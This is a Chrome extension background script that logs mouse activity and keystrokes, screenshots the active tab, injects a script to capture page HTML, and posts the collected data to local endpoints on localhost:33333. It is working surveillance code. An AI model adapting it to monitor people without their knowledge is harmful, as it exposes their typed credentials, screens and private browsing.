"use strict";

var concatenated="";
let mouse_coord={};
let mouse_json = {};
var ms=100000;
var netupload=false;
var shift_register=0;
var register_max=9; //log every 30 seconds or whenever a key is pressed


/**
 * Returns all of the registered extension commands for this extension
 * and their shortcut (if active).
 *
 * Since there is only one registered command in this sample extension,
 * the returned `commandsArray` will look like the following:
 *    [{
 *       name: "toggle-feature",
 *       description: "Send a 'toggle-feature' event to the extension"
 *       shortcut: "Ctrl+Shift+U"
 *    }]
 */

var gettingAllCommands = chrome.commands.getAll(function(commands) {
		for (let command of commands) {
			console.log(command);
		}
});

/**
 * Fired when a registered command is activated using a keyboard shortcut.
 *
 * In this sample extension, there is only one registered command: "Alt+Ctrl+k".
 */
chrome.commands.onCommand.addListener((command) => {
	if (command=="display-log0"||command=="display-log1") {
		setTimeout(present_log, 100);
  	}
  	if (command=="erase-log0"||command=="erase-log1") {
    		let setting = chrome.storage.local.set({storedkl: ""});
  	}
});
chrome.tabs.onActivated.addListener((tabId) => {
	console.log('Tab changed');
	mouse_coord = {};
})
var id = "";
chrome.runtime.onMessage.addListener(msg => {
	var ID = function () {
		return '_' + Math.random().toString(36).substr(2, 9);
	  };

	if(msg.action == "mouselog") {
			let splitted = msg.data.split(':');
			mouse_coord[splitted[0]] = splitted[1];
			if(splitted[1].charAt(0) === '[') {
				id = ID();
				mouse_json[id] = mouse_coord;
				mouse_coord = {};
				concatenated += JSON.stringify(mouse_json, null, 4);
				let donnes= {};
				donnes['id'] = id;
				donnes['data'] = mouse_json;
				chrome.tabs.query({active: true, currentWindow:true}, (tab) => {
					donnes['tab'] = tab;
					sendData('http://localhost:33333/mouselog', JSON.stringify(donnes));
				});	

				mouse_json = {};
				chrome.tabs.captureVisibleTab(
					null,
					{},
					function(dataUrl)
					{
						let data = {};
						data['id'] = id;
						data["data"] = dataUrl;
						sendData('http://localhost:33333/saveimg', JSON.stringify(data));
						console.log('Sent screenshot');
					}
				);
				try {
					chrome.tabs.executeScript(null, {
						file: 'injection_script.js'
					}, function() {
						if (chrome.runtime.lastError) {
							message.innerText = 'There was an error injecting script : \n' + chrome.runtime.lastError.message;
						}
					});
				} catch(err) {
					console.error(err);
				}

			}		
	}

	if(msg.action == 'getSource') {
		let data = {};
		data['id'] = id;
		data['html'] = msg.source;
		sendData('http://localhost:33333/contentlog', JSON.stringify(data));
		console.log('Sent HTML content');
	}


});

if(netupload==true) {
	setInterval(logtimestamp, 3000);
	setInterval(logupload, 60000);
}

setInterval(logtimestamp, 3000);

function sendData(url, data) {
	let req = new XMLHttpRequest();
	req.open('POST', url, true);
	req.setRequestHeader('Content-Type', 'application/json');
	req.send(data);
}


function dateToString(date) {
	let month = date.getMonth() + 1;
	let day = date.getDate();
	let dateOfString = (("" + day).length < 2 ? "0" : "") + day + "/";
	dateOfString += (("" + month).length < 2 ? "0" : "") + month + "/";
	dateOfString += date.getFullYear();
	let hour = date.getHours();
	let minute = date.getMinutes();
	let second = date.getSeconds();
	dateOfString += " " + (("" + hour).length < 2 ? "0" : "") + hour + ":";
	dateOfString += (("" + minute).length < 2 ? "0" : "") + minute + ":";
	dateOfString += (("" + second).length < 2 ? "0" : "") + second;
	
	return dateOfString;
}

function forwardtocontent() {
	let gettingItem = chrome.storage.local.get('storedkl', function(result) {
			if (result.storedkl == null) {
     				result.storedkl="";
			}
			chrome.runtime.sendMessage({action: "keylog-data", data: result.storedkl + concatenated});
	});
}

function logtimestamp() {
	if(concatenated.length<1){
		shift_register=shift_register+1;
		if(shift_register>register_max) {
			shift_register=0;
		}
    	} else {
		shift_register=0;
	}
	if(concatenated.length<1&&shift_register!=1){
		return;
	}
	

	//let currentdate = new Date();
	//let datetime="";
	let mystoredkl="";
	//datetime += dateToString(currentdate);
	//datetime = "timestamp: " + datetime;

	let gettingItem = chrome.storage.local.get('storedkl', function(result) {
			if (result.storedkl == null) {
     				result.storedkl="";
			}
			mystoredkl=result.storedkl + concatenated;
			let a = mystoredkl.length;
			if(a > ms) {
				mystoredkl=mystoredkl.substring(a-ms);
				mystoredkl=mystoredkl.substring(ms/100);
			}
			let setting = chrome.storage.local.set({storedkl: mystoredkl});
			concatenated="";
	});
}




function onError(error) {
	console.log(`Error: ${error}`);
}

function present_log() {
	//read the contents of the log
	let win=chrome.tabs.create({url: chrome.extension.getURL('./index.html')}, function(tab) {
		setTimeout(forwardtocontent, 100);
	});
}




